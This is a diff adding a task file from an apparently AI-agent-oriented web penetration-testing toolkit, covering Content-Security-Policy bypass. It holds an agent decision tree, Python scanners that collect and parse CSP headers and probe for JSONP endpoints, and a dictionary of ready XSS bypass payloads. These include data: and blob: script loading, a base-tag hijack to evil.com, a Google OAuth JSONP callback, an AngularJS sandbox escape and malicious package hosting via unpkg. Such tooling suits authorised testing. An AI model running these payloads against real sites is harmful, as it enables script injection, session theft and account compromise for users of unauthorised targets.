@@ -1,0 +1,685 @@
+================================================================================
+TASK 95 - CSP BYPASS
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 50
+Content Security Policy analysis and bypass techniques
+
+CSP = DEFENSE IN DEPTH AGAINST XSS
+But misconfigured CSP = false sense of security
+Find the gaps, bypass the policy, achieve XSS anyway.
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/xss/xss_injection_points.txt       <- XSS targets (from task 40)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/csp/
+    policies_raw.txt                       <- All CSP headers collected
+    policy_analysis.json                   <- Parsed and analyzed policies
+    weak_policies.txt                      <- Policies with weaknesses
+    bypass_vectors.txt                     <- Possible bypass vectors
+    no_csp.txt                             <- Pages without CSP
+
+outputs/vulnerabilities/CSP-BYPASS-*-MEDIUM.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND CSP DIRECTIVES:
+
+    Key CSP directives:
+    |
+    +-- default-src
+    |   +-- Fallback for other directives
+    |   +-- 'self' = same origin only
+    |   +-- 'none' = block everything
+    |
+    +-- script-src
+    |   +-- Controls script sources
+    |   +-- 'self' = same origin scripts
+    |   +-- 'unsafe-inline' = allows inline scripts (WEAK!)
+    |   +-- 'unsafe-eval' = allows eval() (WEAK!)
+    |   +-- 'nonce-xxx' = nonce-based allowlisting
+    |   +-- 'strict-dynamic' = trust nonce'd scripts' children
+    |   +-- https://cdn.example.com = specific CDN
+    |
+    +-- object-src
+    |   +-- Flash, Java plugins
+    |   +-- Should be 'none' in modern apps
+    |
+    +-- base-uri
+    |   +-- Controls <base> tag
+    |   +-- Can redirect relative URLs!
+    |
+    +-- frame-ancestors
+    |   +-- Clickjacking protection
+    |   +-- Covered in Task 94
+
+    Bypass decision tree:
+    |
+    Is 'unsafe-inline' present?
+    |-- YES → Inline XSS works directly
+    |-- NO → Continue
+    |
+    Is 'unsafe-eval' present?
+    |-- YES → eval(), Function(), setTimeout(string) work
+    |-- NO → Continue
+    |
+    Is there a bypassable CDN allowed?
+    |-- YES → Host payload on CDN / use JSONP
+    |-- NO → Continue
+    |
+    Is base-uri missing?
+    |-- YES → <base> tag hijacking possible
+    |-- NO → Continue
+    |
+    Is there a JSONP endpoint allowed?
+    |-- YES → Use JSONP for XSS
+    |-- NO → Continue
+    |
+    Is 'strict-dynamic' with bypassable nonce?
+    |-- YES → Inject into nonce'd script area
+    |-- NO → CSP is likely strong
+
+================================================================================
+PHASE 1: COLLECT CSP POLICIES
+================================================================================
+
+-----------------------------------------
+1.1 Extract CSP Headers
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+csp_collector.py - Collect and parse CSP policies
+"""
+
+import requests
+import re
+import json
+import os
+from urllib.parse import urlparse
+
+os.makedirs('outputs/csp', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class CSPCollector:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.policies = []
+    
+    def get_csp(self, url):
+        """Get CSP header from URL"""
+        
+        try:
+            resp = self.session.get(url, timeout=15, verify=False)
+            
+            csp = resp.headers.get('Content-Security-Policy', '')
+            csp_ro = resp.headers.get('Content-Security-Policy-Report-Only', '')
+            
+            # Also check meta tag
+            meta_csp = ''
+            meta_match = re.search(
+                r'<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]+content=["\']([^"\']+)["\']',
+                resp.text, re.IGNORECASE
+            )
+            if meta_match:
+                meta_csp = meta_match.group(1)
+            
+            return {
+                'url': url,
+                'csp_header': csp,
+                'csp_report_only': csp_ro,
+                'csp_meta': meta_csp,
+                'has_csp': bool(csp or csp_ro or meta_csp)
+            }
+            
+        except:
+            return None
+    
+    def parse_csp(self, csp_string):
+        """Parse CSP into directives"""
+        
+        if not csp_string:
+            return {}
+        
+        directives = {}
+        
+        for directive in csp_string.split(';'):
+            directive = directive.strip()
+            if not directive:
+                continue
+            
+            parts = directive.split()
+            if parts:
+                name = parts[0].lower()
+                values = parts[1:] if len(parts) > 1 else []
+                directives[name] = values
+        
+        return directives
+    
+    def collect_all(self, urls):
+        """Collect CSP from all URLs"""
+        
+        for url in urls:
+            result = self.get_csp(url)
+            if result:
+                # Use header CSP or fallback to meta
+                csp_string = result['csp_header'] or result['csp_meta']
+                result['parsed'] = self.parse_csp(csp_string)
+                self.policies.append(result)
+        
+        return self.policies
+
+================================================================================
+PHASE 2: ANALYZE CSP WEAKNESSES
+================================================================================
+
+-----------------------------------------
+2.1 Weakness Detection
+-----------------------------------------
+class CSPAnalyzer:
+    
+    # Known CDNs with JSONP or exploitable endpoints
+    BYPASSABLE_CDNS = [
+        'cdnjs.cloudflare.com',
+        'cdn.jsdelivr.net',
+        'unpkg.com',
+        'ajax.googleapis.com',
+        'code.jquery.com',
+        'stackpath.bootstrapcdn.com',
+        'maxcdn.bootstrapcdn.com',
+        'raw.githubusercontent.com',
+        'gist.githubusercontent.com',
+        'pastebin.com',
+        '*.amazonaws.com',
+        '*.cloudfront.net',
+        'storage.googleapis.com',
+    ]
+    
+    # Known JSONP endpoints
+    JSONP_ENDPOINTS = [
+        'google.com/complete/search',
+        'accounts.google.com/o/oauth2/revoke',
+        'cse.google.com/api',
+        'www.google.com/jsapi',
+        'www.googleadservices.com',
+        'translate.googleapis.com',
+    ]
+    
+    def __init__(self):
+        self.weaknesses = []
+    
+    def analyze(self, policy_result):
+        """Analyze single CSP for weaknesses"""
+        
+        url = policy_result['url']
+        parsed = policy_result['parsed']
+        findings = []
+        
+        # 1. No CSP at all
+        if not policy_result['has_csp']:
+            findings.append({
+                'type': 'no_csp',
+                'severity': 'MEDIUM',
+                'description': 'No CSP policy found'
+            })
+            return findings
+        
+        # 2. unsafe-inline in script-src
+        script_src = parsed.get('script-src', parsed.get('default-src', []))
+        if "'unsafe-inline'" in script_src:
+            findings.append({
+                'type': 'unsafe_inline',
+                'severity': 'HIGH',
+                'description': 'script-src allows unsafe-inline - XSS possible',
+                'bypass': 'Use inline <script> tags directly'
+            })
+        
+        # 3. unsafe-eval
+        if "'unsafe-eval'" in script_src:
+            findings.append({
+                'type': 'unsafe_eval',
+                'severity': 'MEDIUM',
+                'description': 'script-src allows unsafe-eval',
+                'bypass': 'Use eval(), Function(), setTimeout(string)'
+            })
+        
+        # 4. Wildcard in script-src
+        if '*' in script_src:
+            findings.append({
+                'type': 'wildcard',
+                'severity': 'HIGH',
+                'description': 'script-src contains wildcard',
+                'bypass': 'Host payload on any domain'
+            })
+        
+        # 5. data: URI allowed
+        if 'data:' in script_src:
+            findings.append({
+                'type': 'data_uri',
+                'severity': 'HIGH',
+                'description': 'script-src allows data: URIs',
+                'bypass': '<script src="data:text/javascript,alert(1)">'
+            })
+        
+        # 6. blob: URI allowed
+        if 'blob:' in script_src:
+            findings.append({
+                'type': 'blob_uri',
+                'severity': 'MEDIUM',
+                'description': 'script-src allows blob: URIs',
+                'bypass': 'Create blob URL with malicious script'
+            })
+        
+        # 7. Bypassable CDNs
+        for source in script_src:
+            for cdn in self.BYPASSABLE_CDNS:
+                if cdn in source or source.endswith(cdn):
+                    findings.append({
+                        'type': 'bypassable_cdn',
+                        'severity': 'MEDIUM',
+                        'description': f'Potentially bypassable CDN: {source}',
+                        'bypass': f'Check for JSONP endpoints on {source}'
+                    })
+        
+        # 8. Missing base-uri
+        if 'base-uri' not in parsed:
+            findings.append({
+                'type': 'missing_base_uri',
+                'severity': 'LOW',
+                'description': 'base-uri not set - <base> tag hijacking possible',
+                'bypass': '<base href="https://evil.com/">'
+            })
+        
+        # 9. Missing object-src
+        object_src = parsed.get('object-src', parsed.get('default-src', []))
+        if "'none'" not in object_src and not object_src:
+            findings.append({
+                'type': 'missing_object_src',
+                'severity': 'LOW',
+                'description': 'object-src not properly restricted',
+                'bypass': 'Plugin-based attacks (Flash, etc.)'
+            })
+        
+        # 10. Check for JSONP in allowed sources
+        for source in script_src:
+            for jsonp in self.JSONP_ENDPOINTS:
+                if jsonp in source:
+                    findings.append({
+                        'type': 'jsonp_endpoint',
+                        'severity': 'HIGH',
+                        'description': f'JSONP endpoint allowed: {source}',
+                        'bypass': f'Use JSONP callback for XSS'
+                    })
+        
+        return findings
+
+================================================================================
+PHASE 3: CSP BYPASS TECHNIQUES
+================================================================================
+
+-----------------------------------------
+3.1 Common Bypass Vectors
+-----------------------------------------
+CSP_BYPASSES = {
+    'unsafe_inline': {
+        'payload': '<script>alert(document.domain)</script>',
+        'description': 'Direct inline script execution'
+    },
+    
+    'unsafe_eval': {
+        'payload': '<img src=x onerror="eval(\'alert(1)\')">',
+        'description': 'Using eval() in event handler'
+    },
+    
+    'data_uri': {
+        'payload': '<script src="data:text/javascript,alert(document.domain)"></script>',
+        'description': 'Script from data: URI'
+    },
+    
+    'base_tag': {
+        'payload': '<base href="https://evil.com/"><script src="/payload.js"></script>',
+        'description': 'Hijack relative URLs via base tag'
+    },
+    
+    'jsonp_google': {
+        'payload': '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>',
+        'description': 'Google OAuth JSONP callback'
+    },
+    
+    'cdnjs_angular': {
+        'payload': '''<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>''',
+        'description': 'AngularJS template injection via cdnjs'
+    },
+    
+    'jsdelivr': {
+        'payload': '<script src="https://cdn.jsdelivr.net/gh/user/repo/payload.js"></script>',
+        'description': 'Host payload on GitHub, serve via jsdelivr'
+    },
+    
+    'unpkg': {
+        'payload': '<script src="https://unpkg.com/your-malicious-package"></script>',
+        'description': 'Publish malicious npm package, use via unpkg'
+    },
+    
+    'blob_uri': {
+        'payload': '''<script>
+var blob = new Blob(['alert(document.domain)'], {type: 'text/javascript'});
+var url = URL.createObjectURL(blob);
+var s = document.createElement('script');
+s.src = url;
+document.body.appendChild(s);
+</script>''',
+        'description': 'Create script via blob URL'
+    },
+}
+
+-----------------------------------------
+3.2 JSONP Finder
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+jsonp_finder.py - Find JSONP endpoints in allowed CSP sources
+"""
+
+import requests
+import re
+
+JSONP_SIGNATURES = [
+    r'callback=',
+    r'jsonp=',
+    r'cb=',
+    r'_callback=',
+    r'jsonpcallback=',
+]
+
+def find_jsonp(base_url, wordlist):
+    """Find JSONP endpoints at URL"""
+    
+    session = requests.Session()
+    jsonp_endpoints = []
+    
+    for path in wordlist:
+        url = f"{base_url}/{path}"
+        
+        # Try with callback parameter
+        for param in ['callback', 'jsonp', 'cb']:
+            test_url = f"{url}?{param}=test123"
+            
+            try:
+                resp = session.get(test_url, timeout=10, verify=False)
+                
+                # Check if callback is reflected
+                if 'test123(' in resp.text:
+                    jsonp_endpoints.append({
+                        'url': test_url,
+                        'param': param,
+                        'response': resp.text[:200]
+                    })
+                    
+            except:
+                continue
+    
+    return jsonp_endpoints
+
+================================================================================
+PHASE 4: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+csp_bypass_complete.py - Complete CSP analysis and bypass generation
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/csp', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class CSPBypassScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.policies = []
+        self.weaknesses = []
+    
+    def get_csp(self, url):
+        """Get and parse CSP from URL"""
+        
+        try:
+            resp = self.session.get(url, timeout=15, verify=False)
+            
+            csp = resp.headers.get('Content-Security-Policy', '')
+            
+            if not csp:
+                return {'url': url, 'has_csp': False, 'parsed': {}}
+            
+            # Parse into directives
+            parsed = {}
+            for directive in csp.split(';'):
+                directive = directive.strip()
+                if directive:
+                    parts = directive.split()
+                    if parts:
+                        parsed[parts[0].lower()] = parts[1:]
+            
+            return {
+                'url': url,
+                'has_csp': True,
+                'raw': csp,
+                'parsed': parsed
+            }
+            
+        except:
+            return None
+    
+    def analyze_csp(self, policy):
+        """Find weaknesses in CSP"""
+        
+        if not policy or not policy['has_csp']:
+            return [{'type': 'no_csp', 'severity': 'MEDIUM'}]
+        
+        parsed = policy['parsed']
+        findings = []
+        
+        script_src = parsed.get('script-src', parsed.get('default-src', []))
+        
+        # Check for common weaknesses
+        checks = [
+            ("'unsafe-inline'" in script_src, 'unsafe_inline', 'HIGH'),
+            ("'unsafe-eval'" in script_src, 'unsafe_eval', 'MEDIUM'),
+            ('*' in script_src, 'wildcard', 'HIGH'),
+            ('data:' in script_src, 'data_uri', 'HIGH'),
+            ('blob:' in script_src, 'blob_uri', 'MEDIUM'),
+            ('base-uri' not in parsed, 'missing_base_uri', 'LOW'),
+        ]
+        
+        for condition, weakness_type, severity in checks:
+            if condition:
+                findings.append({
+                    'type': weakness_type,
+                    'severity': severity
+                })
+        
+        # Check for bypassable CDNs
+        bypassable_cdns = [
+            'cdnjs.cloudflare.com', 'cdn.jsdelivr.net', 'unpkg.com',
+            'ajax.googleapis.com', 'raw.githubusercontent.com'
+        ]
+        
+        for source in script_src:
+            for cdn in bypassable_cdns:
+                if cdn in source:
+                    findings.append({
+                        'type': 'bypassable_cdn',
+                        'severity': 'MEDIUM',
+                        'cdn': cdn
+                    })
+        
+        return findings
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs"""
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(self.get_csp, url): url 
+                      for url in urls}
+            
+            for future in as_completed(futures):
+                policy = future.result()
+                if policy:
+                    self.policies.append(policy)
+                    
+                    findings = self.analyze_csp(policy)
+                    if findings:
+                        self.weaknesses.append({
+                            'url': policy['url'],
+                            'findings': findings
+                        })
+    
+    def generate_bypasses(self):
+        """Generate bypass payloads for each weakness"""
+        
+        bypasses = []
+        
+        for weak in self.weaknesses:
+            url = weak['url']
+            
+            for finding in weak['findings']:
+                bypass = CSP_BYPASSES.get(finding['type'])
+                if bypass:
+                    bypasses.append({
+                        'url': url,
+                        'weakness': finding['type'],
+                        'payload': bypass['payload'],
+                        'description': bypass['description']
+                    })
+        
+        return bypasses
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        for i, weak in enumerate(self.weaknesses):
+            high_findings = [f for f in weak['findings'] 
+                           if f.get('severity') == 'HIGH']
+            
+            if not high_findings:
+                continue
+            
+            findings_text = '\n'.join([
+                f"- **{f['type']}**: {f.get('cdn', 'N/A')}"
+                for f in weak['findings']
+            ])
+            
+            report = f"""# CSP Bypass Vulnerability
+
+**URL**: {weak['url']}
+**Severity**: MEDIUM to HIGH
+
+## CSP Weaknesses Found
+{findings_text}
+
+## Impact
+The Content Security Policy has weaknesses that allow XSS attacks
+to bypass the intended protections.
+
+## Bypass Techniques
+See outputs/csp/bypass_vectors.txt for specific payloads.
+
+## Recommendations
+1. Remove `'unsafe-inline'` and `'unsafe-eval'` from script-src
+2. Use nonces or hashes for inline scripts
+3. Restrict CDN sources to specific paths
+4. Add `base-uri 'self'` or `'none'`
+5. Use `object-src 'none'`
+"""
+            
+            with open(f'outputs/vulnerabilities/CSP-BYPASS-{i}-MEDIUM.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        # Raw policies
+        with open('outputs/csp/policies_raw.txt', 'w') as f:
+            for p in self.policies:
+                if p.get('raw'):
+                    f.write(f"{p['url']}|{p['raw']}\n")
+        
+        # Analysis
+        with open('outputs/csp/policy_analysis.json', 'w') as f:
+            json.dump(self.policies, f, indent=2)
+        
+        # Weak policies
+        with open('outputs/csp/weak_policies.txt', 'w') as f:
+            for w in self.weaknesses:
+                types = ','.join([f['type'] for f in w['findings']])
+                f.write(f"{w['url']}|{types}\n")
+        
+        # No CSP
+        with open('outputs/csp/no_csp.txt', 'w') as f:
+            for p in self.policies:
+                if not p.get('has_csp'):
+                    f.write(f"{p['url']}\n")
+        
+        # Bypass vectors
+        bypasses = self.generate_bypasses()
+        with open('outputs/csp/bypass_vectors.txt', 'w') as f:
+            for b in bypasses:
+                f.write(f"URL: {b['url']}\n")
+                f.write(f"Weakness: {b['weakness']}\n")
+                f.write(f"Payload:\n{b['payload']}\n")
+                f.write("---\n")
+
+# Run
+if __name__ == "__main__":
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    print(f"[*] Analyzing CSP on {len(urls)} URLs...")
+    
+    scanner = CSPBypassScanner()
+    scanner.scan_all(urls)
+    scanner.save_results()
+    scanner.generate_reports()
+    
+    no_csp = len([p for p in scanner.policies if not p.get('has_csp')])
+    weak = len(scanner.weaknesses)
+    
+    print(f"\n[*] Pages without CSP: {no_csp}")
+    print(f"[*] Pages with weak CSP: {weak}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] CSP headers collected from all pages
+[ ] CSP parsed into directives
+[ ] unsafe-inline/unsafe-eval detected
+[ ] Bypassable CDNs identified
+[ ] JSONP endpoints checked
+[ ] base-uri restriction checked
+[ ] Bypass payloads generated
+[ ] Reports created for HIGH severity findings
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 96: Host Header Attacks (Phase 15 - Misc Advanced)
